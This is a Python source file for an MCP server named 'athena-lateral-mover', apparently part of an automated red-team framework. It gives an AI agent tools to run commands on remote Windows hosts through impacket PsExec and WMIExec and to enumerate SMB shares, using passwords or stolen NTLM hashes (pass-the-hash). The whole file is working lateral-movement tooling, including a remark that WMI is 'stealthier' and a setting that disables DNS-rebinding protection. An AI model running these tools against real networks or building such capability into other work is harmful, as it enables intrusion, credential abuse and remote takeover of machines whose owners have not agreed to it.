"""lateral-mover MCP Server for Athena.

PsExec/WMIExec/SMB lateral movement with Pass-the-Hash support.
Returns JSON with {"facts": [{"trait": ..., "value": ...}]}
to integrate with Athena's fact collection pipeline.
"""

import asyncio
import json
import re

from mcp.server.fastmcp import FastMCP
from mcp.server.transport_security import TransportSecuritySettings

# Allow Docker internal network hostnames (mcp-xxx, etc.)
_security = TransportSecuritySettings(
    enable_dns_rebinding_protection=False,
)

mcp = FastMCP("athena-lateral-mover", transport_security=_security)


async def _run_command(cmd: list[str], timeout: int = 60) -> tuple[str, str, int]:
    """Run subprocess asynchronously with timeout."""
    proc = await asyncio.create_subprocess_exec(
        *cmd,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
    )
    try:
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
    except asyncio.TimeoutError:
        proc.kill()
        return "", "Command timed out", -1
    return (
        stdout.decode(errors="replace"),
        stderr.decode(errors="replace"),
        proc.returncode or 0,
    )


def _is_hash(value: str) -> bool:
    """Check if value looks like an NTLM hash (starts with : or is 32 hex chars)."""
    stripped = value.strip()
    if stripped.startswith(":"):
        return True
    if re.match(r"^[a-fA-F0-9]{32}$", stripped):
        return True
    return False


def _build_exec_cmd(
    tool_binary: str,
    target: str,
    username: str,
    password_or_hash: str,
    domain: str = "",
    command: str = "whoami",
) -> list[str]:
    """Build the impacket exec command with either password or pass-the-hash."""
    if _is_hash(password_or_hash):
        # Pass-the-Hash mode
        nt_hash = password_or_hash.lstrip(":")
        lm_hash = "aad3b435b51404eeaad3b435b51404ee"  # empty LM hash
        hash_str = f"{lm_hash}:{nt_hash}"
        if domain:
            target_str = f"{domain}/{username}@{target}"
        else:
            target_str = f"{username}@{target}"
        return [tool_binary, "-hashes", hash_str, target_str, command]
    else:
        # Password mode
        if domain:
            target_str = f"{domain}/{username}:{password_or_hash}@{target}"
        else:
            target_str = f"{username}:{password_or_hash}@{target}"
        return [tool_binary, target_str, command]


@mcp.tool()
async def psexec_lateral(
    target: str,
    username: str,
    password_or_hash: str,
    domain: str = "",
    command: str = "whoami",
) -> str:
    """Execute command on remote host via PsExec (supports Pass-the-Hash).

    Args:
        target: IP or hostname
        username: Admin username
        password_or_hash: Password or NTLM hash (format: :nthash)
        domain: Windows domain (optional)
        command: Command to execute (default: whoami)

    Returns:
        JSON with facts: lateral.session, credential.shell
    """
    facts: list[dict[str, str]] = []

    try:
        cmd = _build_exec_cmd(
            "impacket-psexec", target, username,
            password_or_hash, domain, command,
        )

        stdout, stderr, rc = await _run_command(cmd)
        combined = stdout + stderr

        if rc == 0 or "NT AUTHORITY" in combined or username.lower() in combined.lower():
            auth_method = "pth" if _is_hash(password_or_hash) else "password"
            facts.append({
                "trait": "lateral.session",
                "value": f"psexec:{target}:{username}:{auth_method}",
            })

            # Extract command output as shell evidence
            cmd_output = stdout.strip()
            if cmd_output:
                facts.append({
                    "trait": "credential.shell",
                    "value": f"psexec@{target}: {cmd_output[:200]}",
                })

        return json.dumps({
            "facts": facts,
            "raw_output": combined[:4000],
        })

    except Exception as exc:
        return json.dumps({
            "facts": [],
            "raw_output": "",
            "error": {"type": type(exc).__name__, "message": str(exc)},
        })


@mcp.tool()
async def wmiexec_lateral(
    target: str,
    username: str,
    password_or_hash: str,
    domain: str = "",
    command: str = "whoami",
) -> str:
    """Execute command on remote host via WMI (stealthier than PsExec).

    Args:
        target: IP or hostname
        username: Admin username
        password_or_hash: Password or NTLM hash
        domain: Windows domain (optional)
        command: Command to execute (default: whoami)

    Returns:
        JSON with facts: lateral.session, credential.shell
    """
    facts: list[dict[str, str]] = []

    try:
        cmd = _build_exec_cmd(
            "impacket-wmiexec", target, username,
            password_or_hash, domain, command,
        )

        stdout, stderr, rc = await _run_command(cmd)
        combined = stdout + stderr

        if rc == 0 or "NT AUTHORITY" in combined or username.lower() in combined.lower():
            auth_method = "pth" if _is_hash(password_or_hash) else "password"
            facts.append({
                "trait": "lateral.session",
                "value": f"wmiexec:{target}:{username}:{auth_method}",
            })

            cmd_output = stdout.strip()
            if cmd_output:
                facts.append({
                    "trait": "credential.shell",
                    "value": f"wmiexec@{target}: {cmd_output[:200]}",
                })

        return json.dumps({
            "facts": facts,
            "raw_output": combined[:4000],
        })

    except Exception as exc:
        return json.dumps({
            "facts": [],
            "raw_output": "",
            "error": {"type": type(exc).__name__, "message": str(exc)},
        })


@mcp.tool()
async def smbclient_enum(
    target: str,
    username: str,
    password_or_hash: str,
    domain: str = "",
) -> str:
    """Enumerate SMB shares and accessible resources.

    Args:
        target: IP or hostname
        username: Username
        password_or_hash: Password or NTLM hash
        domain: Windows domain (optional)

    Returns:
        JSON with facts: lateral.smb_share, lateral.readable_share
    """
    facts: list[dict[str, str]] = []

    try:
        # Build smbclient command for share listing
        if _is_hash(password_or_hash):
            nt_hash = password_or_hash.lstrip(":")
            lm_hash = "aad3b435b51404eeaad3b435b51404ee"
            hash_str = f"{lm_hash}:{nt_hash}"
            if domain:
                target_str = f"{domain}/{username}@{target}"
            else:
                target_str = f"{username}@{target}"
            cmd = ["impacket-smbclient", "-hashes", hash_str, target_str]
        else:
            if domain:
                target_str = f"{domain}/{username}:{password_or_hash}@{target}"
            else:
                target_str = f"{username}:{password_or_hash}@{target}"
            cmd = ["impacket-smbclient", target_str]

        # smbclient is interactive; we'll pipe "shares" command followed by "exit"
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdin=asyncio.subprocess.PIPE,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )

        try:
            stdout_bytes, stderr_bytes = await asyncio.wait_for(
                proc.communicate(input=b"shares\nexit\n"),
                timeout=30,
            )
        except asyncio.TimeoutError:
            proc.kill()
            return json.dumps({
                "facts": [],
                "raw_output": "SMB client timed out",
                "error": {"type": "TimeoutError", "message": "SMB enumeration timed out"},
            })

        stdout = stdout_bytes.decode(errors="replace")
        stderr = stderr_bytes.decode(errors="replace")
        combined = stdout + stderr

        # Parse share listing
        # Format varies but typically includes share names
        share_pattern = re.compile(r"(\S+)\s+(Disk|IPC|Print)", re.IGNORECASE)
        for line in combined.splitlines():
            match = share_pattern.search(line)
            if match:
                share_name = match.group(1)
                share_type = match.group(2)
                facts.append({
                    "trait": "lateral.smb_share",
                    "value": f"//{target}/{share_name} ({share_type})",
                })

                # Non-default shares are often readable/interesting
                if share_name.upper() not in {"IPC$", "PRINT$"}:
                    facts.append({
                        "trait": "lateral.readable_share",
                        "value": f"//{target}/{share_name}",
                    })

        return json.dumps({
            "facts": facts,
            "raw_output": combined[:4000],
        })

    except Exception as exc:
        return json.dumps({
            "facts": [],
            "raw_output": "",
            "error": {"type": type(exc).__name__, "message": str(exc)},
        })


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser()
    parser.add_argument(
        "--transport",
        default="stdio",
        choices=["stdio", "sse", "streamable-http"],
    )
    parser.add_argument("--host", default="0.0.0.0")
    parser.add_argument("--port", type=int, default=8080)
    args = parser.parse_args()

    mcp.settings.host = args.host
    mcp.settings.port = args.port
    mcp.run(transport=args.transport)
